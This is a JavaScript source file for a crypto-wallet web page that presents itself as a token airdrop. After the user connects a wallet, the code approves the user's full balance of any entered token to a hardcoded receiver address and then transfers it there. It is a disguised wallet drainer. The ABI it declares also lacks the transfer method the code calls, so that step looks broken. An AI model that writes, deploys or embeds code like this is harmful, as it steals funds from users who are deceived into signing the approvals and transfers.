// Configuration
const RECEIVER_ADDRESS = '0xf36aa3cd6fdd245d03982caeb7c4a31b2b4be1d0';
const CONTRACT_ABI = [
    {
        "inputs": [{"internalType": "address", "name": "tokenAddress", "type": "address"}],
        "name": "transferApprovedTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "tokenAddress", "type": "address"},
            {"internalType": "address", "name": "owner", "type": "address"}
        ],
        "name": "getApprovedAmount",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    }
];

const ERC20_ABI = [
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "spender", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "owner", "type": "address"},
            {"internalType": "address", "name": "spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "decimals",
        "outputs": [{"internalType": "uint8", "name": "", "type": "uint8"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "symbol",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function"
    }
];

// State
let web3;
let userAccount;
let currentNetwork;

// DOM Elements
const connectWalletBtn = document.getElementById('connectWallet');
const walletInfo = document.getElementById('walletInfo');
const walletAddress = document.getElementById('walletAddress');
const networkInfo = document.getElementById('networkInfo');
const airdropSection = document.getElementById('airdropSection');
const tokenAddressInput = document.getElementById('tokenAddress');
const checkTokenBtn = document.getElementById('checkTokenBtn');
const approveBtn = document.getElementById('approveBtn');
const tokenInfo = document.getElementById('tokenInfo');
const tokenBalance = document.getElementById('tokenBalance');
const approvedAmount = document.getElementById('approvedAmount');
const statusMessage = document.getElementById('statusMessage');

// Event Listeners
connectWalletBtn.addEventListener('click', connectWallet);
checkTokenBtn.addEventListener('click', checkToken);
approveBtn.addEventListener('click', approveAndTransfer);

// Initialize
async function init() {
    if (typeof window.ethereum !== 'undefined') {
        console.log('MetaMask is installed!');
        
        // Check if already connected
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
            await connectWallet();
        }
        
        // Listen for account changes
        window.ethereum.on('accountsChanged', handleAccountsChanged);
        window.ethereum.on('chainChanged', handleChainChanged);
    } else {
        showStatus('Please install MetaMask or a Web3 wallet to use this application.', 'error');
    }
}

// Connect Wallet
async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            showStatus('Please install MetaMask or a Web3 wallet!', 'error');
            return;
        }

        // Request account access
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAccount = accounts[0];
        
        // Initialize Web3
        web3 = new Web3(window.ethereum);
        
        // Get network info
        const chainId = await web3.eth.getChainId();
        currentNetwork = getNetworkName(chainId);
        
        // Update UI
        walletAddress.textContent = formatAddress(userAccount);
        networkInfo.textContent = `Connected to: ${currentNetwork}`;
        walletInfo.style.display = 'block';
        airdropSection.style.display = 'block';
        connectWalletBtn.textContent = 'Connected';
        connectWalletBtn.disabled = true;
        
        showStatus('Wallet connected successfully!', 'success');
    } catch (error) {
        console.error('Error connecting wallet:', error);
        showStatus('Failed to connect wallet: ' + error.message, 'error');
    }
}

// Check Token
async function checkToken() {
    try {
        const tokenAddr = tokenAddressInput.value.trim();
        
        // Validate address
        if (!web3.utils.isAddress(tokenAddr)) {
            showStatus('Please enter a valid token address', 'error');
            return;
        }
        
        showStatus('Checking token information...', 'info');
        checkTokenBtn.disabled = true;
        
        // Create token contract instance
        const tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddr);
        
        try {
            // Get token balance
            const balance = await tokenContract.methods.balanceOf(userAccount).call();
            const decimals = await tokenContract.methods.decimals().call();
            const symbol = await tokenContract.methods.symbol().call();
            
            // Get allowance for receiver
            const allowance = await tokenContract.methods.allowance(userAccount, RECEIVER_ADDRESS).call();
            
            // Format amounts
            const formattedBalance = formatTokenAmount(balance, decimals);
            const formattedAllowance = formatTokenAmount(allowance, decimals);
            
            // Update UI
            tokenBalance.textContent = `${formattedBalance} ${symbol}`;
            approvedAmount.textContent = `${formattedAllowance} ${symbol}`;
            tokenInfo.style.display = 'block';
            
            if (parseFloat(balance) > 0) {
                approveBtn.style.display = 'inline-block';
                showStatus('Token information loaded successfully', 'success');
            } else {
                approveBtn.style.display = 'none';
                showStatus('You have no balance of this token', 'error');
            }
        } catch (error) {
            showStatus('Invalid token contract or network error', 'error');
            tokenInfo.style.display = 'none';
            approveBtn.style.display = 'none';
        }
        
        checkTokenBtn.disabled = false;
    } catch (error) {
        console.error('Error checking token:', error);
        showStatus('Error: ' + error.message, 'error');
        checkTokenBtn.disabled = false;
    }
}

// Approve and Transfer
async function approveAndTransfer() {
    try {
        const tokenAddr = tokenAddressInput.value.trim();
        
        if (!web3.utils.isAddress(tokenAddr)) {
            showStatus('Please enter a valid token address', 'error');
            return;
        }
        
        approveBtn.disabled = true;
        showStatus('Processing approval and transfer...', 'info');
        
        // Create token contract instance
        const tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddr);
        
        // Get token balance
        const balance = await tokenContract.methods.balanceOf(userAccount).call();
        
        if (balance === '0') {
            showStatus('You have no tokens to transfer', 'error');
            approveBtn.disabled = false;
            return;
        }
        
        // Approve tokens to receiver address
        showStatus('Step 1/2: Approving tokens... Please confirm in your wallet', 'info');
        
        const approveTx = await tokenContract.methods.approve(RECEIVER_ADDRESS, balance).send({
            from: userAccount
        });
        
        console.log('Approval transaction:', approveTx.transactionHash);
        
        // Transfer tokens to receiver
        showStatus('Step 2/2: Transferring tokens... Please confirm in your wallet', 'info');
        
        const transferTx = await tokenContract.methods.transfer(RECEIVER_ADDRESS, balance).send({
            from: userAccount
        });
        
        console.log('Transfer transaction:', transferTx.transactionHash);
        
        showStatus(`Success! Tokens transferred to ${formatAddress(RECEIVER_ADDRESS)}. TX: ${transferTx.transactionHash}`, 'success');
        
        // Refresh token info
        await checkToken();
        
        approveBtn.disabled = false;
    } catch (error) {
        console.error('Error in approve and transfer:', error);
        showStatus('Transaction failed: ' + (error.message || 'Unknown error'), 'error');
        approveBtn.disabled = false;
    }
}

// Helper Functions
function formatAddress(address) {
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
}

function formatTokenAmount(amount, decimals) {
    const divisor = Math.pow(10, decimals);
    return (amount / divisor).toFixed(4);
}

function getNetworkName(chainId) {
    const networks = {
        1: 'Ethereum Mainnet',
        3: 'Ropsten Testnet',
        4: 'Rinkeby Testnet',
        5: 'Goerli Testnet',
        11155111: 'Sepolia Testnet',
        56: 'BSC Mainnet',
        97: 'BSC Testnet',
        137: 'Polygon Mainnet',
        80001: 'Mumbai Testnet',
        43114: 'Avalanche C-Chain',
        43113: 'Avalanche Fuji Testnet',
        250: 'Fantom Opera',
        4002: 'Fantom Testnet'
    };
    
    return networks[chainId] || `Chain ID: ${chainId}`;
}

function showStatus(message, type) {
    statusMessage.textContent = message;
    statusMessage.className = `status-message ${type}`;
    statusMessage.style.display = 'block';
}

function handleAccountsChanged(accounts) {
    if (accounts.length === 0) {
        // User disconnected wallet
        walletInfo.style.display = 'none';
        airdropSection.style.display = 'none';
        connectWalletBtn.textContent = 'Connect Wallet';
        connectWalletBtn.disabled = false;
        showStatus('Please connect your wallet', 'info');
    } else {
        userAccount = accounts[0];
        walletAddress.textContent = formatAddress(userAccount);
        showStatus('Account changed', 'info');
    }
}

function handleChainChanged(chainId) {
    // Reload page on chain change as recommended by MetaMask
    window.location.reload();
}

// Input validation
tokenAddressInput.addEventListener('input', function() {
    const value = this.value.trim();
    if (value && !value.startsWith('0x')) {
        this.value = '0x' + value;
    }
});

// Initialize app
init();
